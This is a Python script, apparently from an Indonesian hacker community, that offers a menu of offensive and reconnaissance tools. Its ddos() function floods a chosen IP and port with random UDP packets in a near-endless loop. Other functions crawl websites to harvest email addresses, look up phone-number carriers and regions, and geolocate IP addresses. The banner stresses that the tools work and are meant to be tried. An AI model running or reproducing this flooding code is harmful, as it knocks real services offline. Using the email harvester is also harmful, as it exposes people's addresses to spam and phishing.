#ImportMOdule
import os,sys,random,time,requests,socket,threading,phonenumbers,re,urllib.parse,json,pyshorteners
from phonenumbers import carrier, geocoder, timezone
from ipaddress import ip_address
from os import link
from collections import deque
from urllib import response
from bs4 import BeautifulSoup
from time import sleep


#Pembersih
def c():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')


#BANNER
banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠐⠢⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠉⠀⠀⠀⠱⠀⠀⠀⠀⠀       ██╗░░██╗██╗░░██╗██╗░█████╗░
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣑⠡⡀⡀⠀⢀⡇⠀⠀⠀⠀       ██║░██╔╝██║░░██║██║██╔══██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣄⠈⣌⠪⡄⢰⢡⠀⠀⠀⠀       █████═╝░███████║██║██║░░╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣾⣀⠈⢂⠃⡈⠘⣄⠀⠀⠀       ██╔═██╗░██╔══██║██║██║░░██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣷⣄⠤⢢⠁⡠⠂⠢⡀⠀       ██║░╚██╗██║░░██║██║╚█████╔╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⣸⡿⠟⣾⠓⠉⡖⠀⠀⠈⢂       ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░╚════╝░
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⡏⢸⠟⠀⣾⠀⠈⢡⡠⠂⠀⠈   [ KOMUNITAS HACKER INDONESIA CYBER]
⠱⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⡀⡇⢈⠐⠠⡟⠀⠀⢞⡿⢅⠄⢀   [ AUTHOR SETA ]
⠀⠹⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠊⢛⡃⠘⠀⠀⡇⠀⡈⠶⠄⠒⠂⡔   NOTE :
⠀⠀⠘⣿⣿⣿⣷⣄⣀⠀⠤⡠⡤⠒⠫⠱⠀⣼⠧⠀⠀⠀⢁⠠⢱⠤⠒⠒⣠⠇  " SCRIPT INI DI BUAT PADA SAAT
⠀⠀⠀⠘⢿⣿⣿⣿⣾⡷⡋⣞⠔⡣⠎⠙⠂⠘⠒⠲⡖⡒⠒⡶⢙⠀⠈⠉⣸    GABUT DAN UNTUK TOOLSNYA
⠀⠀⠀⠀⠀⠉⠻⣿⣿⡿⣿⣿⣯⠪⡖⠤⠤⠔⣀⣤⡃⠀⠀⡁⠀⣀⠄⠊⡜⠀   WORK BUAT DI COBA BUKAN
⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡌⠙⢿⣾⡫⠅⠂⠉⠀⠀⠁⠪⢁⠈⠉⠀⠀⣸⠀⠀   PAJANGAN DOANG ANJING!!"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠉⠀⠀
═════════════════════════════════════════════════════════════════
        [01] DDOS WEBSITE/WIFI    [05] GET  HTML
        [02] LACAK NOMER          [07] IP GEOLOCATION
        [03] EMAIL SCRAPPER       [08] SHORT LINK TINYURL
        [04] IP CHEKER            [00] EXIT
═════════════════════════════════════════════════════════════════
"""

#SISTEM MENU
def menu():
    c()
    print(banner)
    men = input("Input >>> ")
    if men in ['1','01']:
        ddos()
    if men in ['2','02']:
        ln()
    if men in ['3','03']:
        wsc()
    if men in ['4','04']:
        ipckr()
    if men in ['5','05']:
        ghl()
    if men in ['7','07']:
        igc()
    if men in ['8','08']:
        shrl()
    else:
        menu()



def ddos():
    target = input("Ip Target >>> ")
    port = int(input("Port >>> "))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    s.connect((target, port))

    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send : {i}", end='\r')

def ln():
    # Masukkan nomor telepon yang akan dicek
    phone_number = input('Masukkan Nomor: ')

    # Parsing nomor telepon
    parsed_number = phonenumbers.parse(phone_number)

    # Mengecek apakah nomor valid atau tidak
    is_valid = phonenumbers.is_valid_number(parsed_number)
    if is_valid:
        print(f"Nomor {phone_number} valid!")
    else:
        print(f"Nomor {phone_number} tidak valid!")

    # Mengecek apakah nomor bisa dihubungi
    is_possible = phonenumbers.is_possible_number(parsed_number)
    if is_possible:
        print(f"Nomor {phone_number} adalah nomor yang mungkin.")
    else:
        print(f"Nomor {phone_number} adalah nomor yang tidak mungkin.")

    # Menampilkan region/lokasi dari nomor telepon
    location = geocoder.description_for_number(parsed_number, "id")
    print(f"Lokasi: {location}")

    # Menampilkan penyedia layanan/operator
    operator = carrier.name_for_number(parsed_number, "id")
    print(f"Operator: {operator}")

    # Menampilkan zona waktu dari nomor telepon
    time_zones = timezone.time_zones_for_number(parsed_number)
    print(f"Zona Waktu: {', '.join(time_zones)}")

    # Menampilkan tipe nomor telepon
    from phonenumbers.phonenumberutil import number_type, PhoneNumberType
    number_type_info = number_type(parsed_number)
    type_mapping = {
        PhoneNumberType.MOBILE: "Mobile",
        PhoneNumberType.FIXED_LINE: "Fixed Line",
        PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixed Line or Mobile",
        PhoneNumberType.TOLL_FREE: "Toll-Free",
        PhoneNumberType.PREMIUM_RATE: "Premium Rate",
        PhoneNumberType.VOIP: "VoIP",
        PhoneNumberType.UNKNOWN: "Unknown",
    }

    print(f"Tipe Nomor: {type_mapping.get(number_type_info, 'Unknown')}")

    # Menampilkan format nomor telepon dalam format internasional
    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    print(f"Format Internasional: {formatted_number}")

    # Menampilkan format nomor telepon dalam format nasional
    formatted_number_national = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)
    print(f"Format Nasional: {formatted_number_national}")

    # Mengecek apakah nomor merupakan nomor internasional
    is_international = phonenumbers.is_valid_number_for_region(parsed_number, "ID")
    if is_international:
        print(f"Nomor {phone_number} adalah nomor valid di Indonesia.")
    else:
        print(f"Nomor {phone_number} bukan nomor yang valid di Indonesia.")

    # Mendapatkan kode negara dari nomor telepon
    country_code = parsed_number.country_code
    print(f"Kode Negara: +{country_code}")

    # Daftar koordinat perkiraan untuk beberapa negara (hanya referensi umum)
    country_coordinates = {
        62: (-2.5489, 118.0149),  # Indonesia
        1: (37.0902, -95.7129),   # Amerika Serikat
        44: (51.509865, -0.118092),  # Inggris
        91: (20.5937, 78.9629),   # India
        81: (35.6895, 139.6917),  # Jepang
        86: (35.8617, 104.1954),  # China
    }

    # Menampilkan koordinat jika tersedia
    if country_code in country_coordinates:
        lat, lng = country_coordinates[country_code]
        print(f"Perkiraan Koordinat: {lat}, {lng}")
        print(f"Google Maps: https://www.google.com/maps?q={lat},{lng}")
    else:
        print("Koordinat tidak tersedia untuk kode negara ini.")



def wsc():
    user_url = str(input('>> Masukan Url : '))
    urls = deque([user_url])

    scraped_urls = set()
    emails = set()

    count = 0
    limit = int(input('>> Limit Pencarian : '))

    try :
        while True:
            count += 1
            if count > limit:
                break

            url = urls.popleft()
            scraped_urls.add(url)
            parts = urllib.parse.urlsplit(url)
            base_url = "{0.scheme}://{0.netloc}".format(parts)
            path = url[:url.rfind('/')+1] if '/' in parts.path else url

            print (f'{count} Memproses >> {url}')

            try:
                response = requests.get(url)
            except(requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
                continue

            new_emails = set(re.findall(r'[a-zA-Z0-9\.\-+_]+@\w+\.+[a-zA-Z\.]+', response.text, re.I))
            emails.update(new_emails)

            soup = BeautifulSoup(response.text, 'html.parser')

            for anchor in soup.find_all("a"):
                if "href" in anchor.attrs:
                    link = anchor.attrs["href"]
                else:
                    link = ""

                    if link.startswith('/'):
                        link = base_url + link

                    elif not link.startswith('http'):
                        link = path + link

                if not link in urls and not link in scraped_urls:
                    urls.append(link)

    except KeyboardInterrupt:
        print('>> Closing')
    
    print('\n>> Proses Selesai')
    print(f'\n{len(emails)} Email Di Temukan \n')

    for mail in emails:
        print('>> ' + mail)

    print('\n')

def ipckr():
    host = input(">> Masukan Domain : ")
    ip_address = socket.gethostbyname(host)

    print(f">> Nama Domain : {host}")
    print(f">> Ip Address : {ip_address}")

def ghl():
    file = open("result.html","w")
    respon = requests.get(input(">> Masukan Link Web : "))
    html = respon.text

    print(html)
    sleep(2)
    data = [str(),".",html,"\n"]
    file.writelines(data)
    sleep(3)


def igc():
    ipaddress = input(">> Masukan IP : ")
    iprequest = requests.get(f"http://ip-api.com/json/{ipaddress}")
    if iprequest.status_code == 200:
        ipdata = json.loads(iprequest.text)
        if ipdata["status"] == "success":
            print(">> Country : ", ipdata["country"], ipdata["countryCode"])
            print(">> Region : ", ipdata["region"], ipdata["regionName"])
            print(">> City : ", ipdata["city"])
            print(">> Zip : ", ipdata["zip"])
            lat = ipdata["lat"]
            lon = ipdata["lon"]
            print(">> Location : ", lat,",", lon)
            maps = f"https://www.google.com/maps/@{lat},{lon},9z?h1=id"
            print(">> Maps : ", maps)
            print(">> TimeZonen: ", ipdata["timezone"])
            print(">> ISP :", ipdata["isp"])
            print(">> IP Address : ", ipdata["query"])


def shrl():
    link_asli = input("Masukan Link : ")
    shortener = pyshorteners.Shortener()
    result = shortener.tinyurl.short(link_asli)
    print(">> Results : ", result)

menu()
